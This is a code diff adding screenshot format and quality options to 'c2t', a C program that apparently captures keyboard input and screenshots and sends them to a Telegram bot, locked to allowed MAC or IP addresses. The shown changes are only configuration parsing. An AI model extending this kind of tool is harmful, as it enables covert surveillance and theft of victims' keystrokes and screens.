@@ -49,6 +49,7 @@ static c2t_config_t config;
 static char embedded_bot_token[512];
 static char embedded_chat_id[128];
 static char embedded_proxy[512];
+static char embedded_screenshot_format[32];
 static char embedded_keyboard_layout[64];
 static char embedded_allowed_mac[256];
 static char embedded_allowed_ip[256];
@@ -234,6 +235,31 @@ void c2t_config_load([[maybe_unused]] const char *executable_path) {
     config.disable_screenshot = configured_flag("C2T_DISABLE_SCREENSHOT") ||
                                configured_flag("DISABLE_SCREENSHOT");
   }
+  config.screenshot_format = configured_value(
+      "C2T_SCREENSHOT_FORMAT", embedded_screenshot_format,
+      sizeof(embedded_screenshot_format));
+  if (!config.screenshot_format || !*config.screenshot_format) {
+    config.screenshot_format = configured_value(
+        "TELEGRAM_SCREENSHOT_FORMAT", embedded_screenshot_format,
+        sizeof(embedded_screenshot_format));
+  }
+  if (!config.screenshot_format || !*config.screenshot_format) {
+    config.screenshot_format = configured_value(
+        "SCREENSHOT_FORMAT", embedded_screenshot_format,
+        sizeof(embedded_screenshot_format));
+  }
+  if (!config.screenshot_format || !*config.screenshot_format) {
+    config.screenshot_format = "png";
+  }
+
+  size_t quality_val = configured_size("C2T_SCREENSHOT_QUALITY", 0);
+  if (quality_val == 0)
+    quality_val = configured_size("TELEGRAM_SCREENSHOT_QUALITY", 0);
+  if (quality_val == 0)
+    quality_val = configured_size("SCREENSHOT_QUALITY", 0);
+  if (quality_val == 0 || quality_val > 100)
+    quality_val = 85;
+  config.screenshot_quality = (int)quality_val;
   config.keyboard_flush_ms =
       configured_size("C2T_KEYBOARD_FLUSH_MS", C2T_DEFAULT_KEYBOARD_FLUSH_MS);
   if (config.keyboard_flush_ms < C2T_MIN_KEYBOARD_FLUSH_MS)
@@ -420,6 +446,23 @@ const char *c2t_config_apply_arguments(int argc, char **argv) {
         return argv[index - 1];
       config.telegram_screenshot_interval_sec = (size_t)val;
       config.telegram_send_screenshots = 1;
+    } else if (strcmp(argv[index], "--screenshot-format") == 0 ||
+               strcmp(argv[index], "--format") == 0) {
+      if (index + 1 >= argc)
+        return argv[index];
+      ++index;
+      config.screenshot_format = argv[index];
+    } else if (strcmp(argv[index], "--screenshot-quality") == 0 ||
+               strcmp(argv[index], "--quality") == 0) {
+      if (index + 1 >= argc)
+        return argv[index];
+      ++index;
+      char *end;
+      errno = 0;
+      long val = strtol(argv[index], &end, 10);
+      if (errno || *end || val < 1 || val > 100)
+        return argv[index - 1];
+      config.screenshot_quality = (int)val;
     } else if (strcmp(argv[index], "--allowed-mac") == 0) {
       if (index + 1 >= argc)
         return argv[index];
